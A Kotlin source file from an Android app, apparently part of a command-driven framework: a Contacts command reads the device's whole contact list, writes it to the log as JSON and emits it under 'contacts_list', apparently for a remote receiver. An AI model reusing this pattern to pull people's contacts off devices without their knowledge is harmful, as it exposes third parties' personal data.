package com.hc.calling.commands.contact

import android.content.Context
import com.google.gson.Gson
import com.hc.calling.commands.Command
import com.hc.calling.commands.Executor
import com.orhanobut.logger.Logger

/**
 * Created by ChanHong on 2019/3/22
 *
 */
class Contacts(context: Context) : Command(), Executor {
    var context: Context? = null

    init {
        this.context = context
    }

    override fun execute(data: Any) {
        val contactsList = ContactUtil.getContacts(context!!)
        val data = Gson().toJson(contactsList)
        Logger.json(data)
        emitData(TYPE_CONTACTS_LIST, data)
    }

    companion object {
        const val TYPE_CONTACTS_LIST = "contacts_list"
        const val TYPE_POST_CONTACTS = "post_contacts_list"
    }
}